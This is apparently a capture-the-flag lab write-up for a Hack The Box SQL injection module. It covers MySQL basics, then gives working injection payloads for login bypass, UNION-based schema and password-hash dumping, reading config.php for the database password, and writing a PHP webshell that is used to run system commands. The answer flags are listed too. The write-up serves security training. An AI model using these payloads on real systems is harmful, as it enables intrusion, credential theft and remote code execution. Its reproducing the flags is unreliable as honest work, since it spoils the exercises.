# HTB-SQL_Injection_Fundamentals

## Table of Contents
0. [Payloads](#payloads)
1. [MySQL](#mysql)
    1. [Intro to MySQL](#intro-to-mysql)
    2. [SQL Statements](#sql-statements)
    3. [Query Results](#query-results)
    4. [SQL Operators](#sql-operators)
2. [SQL Injections](#sql-injections)
    1. [Subverting Query Logic](#subverting-query-logic)
    2. [Using Comments](#using-comments)
    3. [Union Clause](#union-clause)
    4. [Union Injection](#union-injection)
3. [Exploitation](#exploitation)
    1. [Database Enumeration](#database-enumeration)
    2. [Reading Files](#reading-files)
    3. [Writing Files](#writing-files)

## Payloads
1. [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

## MySQL
### Intro to MySQL
#### Challenges
1. Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?

    We can connect to MySQL target by using this command:

    ```bash
    mysql -u root -h 94.237.120.119 -P 41363 -p
    ```
    Once we in the mysql session, we can use this command to get the database name:

    ```sql
    show databases;
    ```
    The answer is `employees`.

### SQL Statements
#### Challenges
1. What is the department number for the 'Development' department?

    Here the complete flow to get the answer.

    ```bash
    mysql -u root -h 94.237.120.119 -P 41363 -p
    ```
    Then we can use this SQL command:

    ```sql
    use employess;
    show tables;
    select * from departments;
    ```
    ![alt text](<Assets/SQL Statements - 1.png>)

    The answer is `d005`.

### Query Results
#### Challenges
1. What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?

    First we can check how employees table structure by using `DESCRIBE`.

    ![alt text](<Assets/Query Results - 1.png>)

    Based on that, we can `SELECT last_name` and using some filters.

    ```sql
    select last_name from employees where first_name like 'Bar%' and hire_date='1990-01-01';
    ```
    The answer is `Mitchem`.

### SQL Operators
#### Challenges
1. In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?

    We can use this filter to solve this:

    ```sql
    select * from titles where emp_no > 10000 || title not like '%Engineer%';
    ```
    The answer is `654`.

## SQL Injections
### Subverting Query Logic
#### Challenges
1. Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?

    To solve this, we can use this payloads in the username field:

    ```sql
    tom' OR '1'='1
    ```
    and we can input anything in the password field. It will look like this:

    ```sql
    SELECT * FROM logins WHERE username='tom' OR '1'='1' AND password = 'f';
    ```
    The answer is `202a1d1a8b195d5e9a57e434cc16000c`.

### Using Comments
#### Challenges
1. Login as the user with the id 5 to get the flag.

    Because the username input will be executed as `username='`, we cant just type `id=5`. We need to use `OR` so it will be always login as `id=5`. Here the payload:

    ```SQL
    f'OR id=5)-- '
    ```
    The answer is `cdad9ecdf6f14b45ff5c4de32909caec`.

### Union Clause
#### Challenges
1. Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.

    We can connect to target by using this:

    ```bash
    mysql -u root -h 83.136.251.105 -P 46811 -p
    ```
    Once we in the sql session, we can explore the databases.

    ```SQL
    show databases;
    use employees;
    show tables;
    ```
    In here, we need to `UNION` employees annd departments tables. To do this, we need to know exactly the total column. We can use `DESCRIBE` to find this information.

    ![alt text](<Assets/Union Clause - 1.png>)

    Based on that, employees table has 6 columns while departments only has 2 columns. We need to fill the rest of the departments columns.

    ```SQL
    SELECT * FROM employees UNION SELECT dept_no, dept_name, 3, 4, 5, 6 FROM departments;
    ```
    The answer is `663`.

### Union Injection
#### Challenges
1. Use a Union injection to get the result of 'user()'

    We can solve this by using this payload:

    ```sql
    cn' UNION select 1,user(),3,4-- -
    ```
    The answer is `root@localhost`.

## Exploitation
### Database Enumeration
#### Challenges
1. What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?

    We can enumerate what is database availabe in here.

    ```SQL
    cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
    ```
    ![alt text](<Assets/Database Enumeration - 1.png>)

    It has ilfreight databse like in the challenge. Now we need to enumerate table name.

    ```SQL
    cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
    ```
    ![alt text](<Assets/Database Enumeration - 2.png>)

    Now we need to know the column structure in the users table.

    ```SQL
    cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
    ```
    ![alt text](<Assets/Database Enumeration - 3.png>)

    It has username and password columns. Now we can try to retrive data from it.

    ```SQL
    cn' UNION select 1, username, password, 4 from ilfreight.users-- -
    ```
    ![alt text](<Assets/Database Enumeration - 4.png>)

    The answer is `9da2c9bcdf39d8610954e0e11ea8f45f`.

### Reading Files
#### Challenges
1. We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.

    Based on the module, this user has previllege to read and load the file. So now, we need to retive the seacrh.php code.
    ```SQL
    cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
    ```
    ![alt text](<Assets/Reading Files - 1.png>)

    The challenge have given us a hint that the database password is located in the imported/included file. We can see from the image above that `config.php` is imported. So we need to read the `config.php` file

    ```SQL
    cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
    ```
    ![alt text](<Assets/Reading Files - 2.png>)

    The answer is `dB_pAssw0rd_iS_flag!`.

### Writing Files
#### Challenges
1. Find the flag by using a webshell.

    Based on the module, we have already know that we have previllege to write files. We can check by using this.

    ```SQL
    cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
    ```
    ![alt text](<Assets/Writing Files - 1.png>)

    Because secure_file_priv is empty, it means secure_file_priv is disabled. Now we can try to write file. This instance is using .php. So it is likely the output will be stored in `/var/www/html/`. Here the payload we can use to write webshell:

    ```SQL
    cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
    ```
    If it doesnt give an error, it is likely success write the file. Now we can try to locate the flag location.

    ```URL
    http://83.136.255.170:38644/shell.php?0=find%20/%20-name%20flag.txt%202%3E/dev/null
    ```
    ![alt text](<Assets/Writing Files - 2.png>)

    Now we can cat the flag by using this:

    ```URL
    83.136.255.170:38644/shell.php?0=cat%20/var/www/flag.txt 
    ```
    The answer is `d2b5b27ae688b6a0f1d21b7d3a0798cd`.